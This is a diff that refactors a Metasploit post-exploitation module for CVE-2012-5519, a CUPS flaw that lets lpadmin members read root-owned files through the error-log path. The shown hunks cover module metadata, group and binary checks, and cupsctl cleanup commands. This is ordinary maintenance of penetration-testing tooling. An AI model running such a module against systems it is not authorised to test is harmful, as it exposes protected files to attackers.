@@ -14,34 +14,37 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        {
-          'Name' => 'CUPS 1.6.1 Root File Read',
-          'Description' => %q{
-            This module exploits a vulnerability in CUPS < 1.6.2, an open source printing system.
-            CUPS allows members of the lpadmin group to make changes to the cupsd.conf
-            configuration, which can specify an Error Log path. When the user visits the
-            Error Log page in the web interface, the cupsd daemon (running with setuid root)
-            reads the Error Log path and echoes it as plaintext.
+        'Name' => 'CUPS 1.6.1 Root File Read',
+        'Description' => %q{
+          This module exploits a vulnerability in CUPS < 1.6.2, an open source printing system.
+          CUPS allows members of the lpadmin group to make changes to the cupsd.conf
+          configuration, which can specify an Error Log path. When the user visits the
+          Error Log page in the web interface, the cupsd daemon (running with setuid root)
+          reads the Error Log path and echoes it as plaintext.
 
-            This module is known to work on Mac OS X < 10.8.4 and Ubuntu Desktop <= 12.0.4
-            as long as the session is in the lpadmin group.
+          This module is known to work on Mac OS X < 10.8.4 and Ubuntu Desktop <= 12.0.4
+          as long as the session is in the lpadmin group.
 
-            Warning: if the user has set up a custom path to the CUPS error log,
-            this module might fail to reset that path correctly. You can specify
-            a custom error log path with the ERROR_LOG datastore option.
-          },
-          'References' => [
-            ['CVE', '2012-5519'],
-            ['OSVDB', '87635'],
-            ['URL', 'http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791']
-          ],
-          'License' => MSF_LICENSE,
-          'Author' => [
-            'Jann Horn', # discovery
-            'joev' # metasploit module
-          ],
-          'DisclosureDate' => '2012-11-20',
-          'Platform' => %w[linux osx]
+          Warning: if the user has set up a custom path to the CUPS error log,
+          this module might fail to reset that path correctly. You can specify
+          a custom error log path with the ERROR_LOG datastore option.
+        },
+        'References' => [
+          ['CVE', '2012-5519'],
+          ['OSVDB', '87635'],
+          ['URL', 'https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791']
+        ],
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Jann Horn', # discovery
+          'joev' # metasploit module
+        ],
+        'DisclosureDate' => '2012-11-20',
+        'Platform' => %w[linux osx],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES],
+          'Reliability' => []
         }
       )
     )
@@ -58,24 +61,24 @@ class MetasploitModule < Msf::Post
     if (user_groups & LP_GROUPS).empty?
       print_error 'User not in lpadmin group.'
       return Msf::Exploit::CheckCode::Safe
-    else
-      print_good 'User in lpadmin group, continuing...'
     end
+
+    print_good 'User in lpadmin group, continuing...'
 
     if ctl_path.blank?
       print_error 'cupsctl binary not found in $PATH'
       return Msf::Exploit::CheckCode::Safe
-    else
-      print_good 'cupsctl binary found in $PATH'
     end
+
+    print_good 'cupsctl binary found in $PATH'
 
     nc_path = whereis('nc')
     if nc_path.nil? || nc_path.blank?
       print_error 'Could not find nc executable'
       return Msf::Exploit::CheckCode::Unknown
-    else
-      print_good 'nc binary found in $PATH'
     end
+
+    print_good 'nc binary found in $PATH'
 
     config_path = whereis('cups-config')
     config_vn = nil
@@ -132,6 +135,7 @@ class MetasploitModule < Msf::Post
     print_status 'Cleaning up...'
     cmd_exec("#{ctl_path} WebInterface=no") if web_server_was_disabled
     cmd_exec("#{ctl_path} ErrorLog=#{prev_error_log_path}") if error_log_was_reset
+  ensure
     super
   end
 
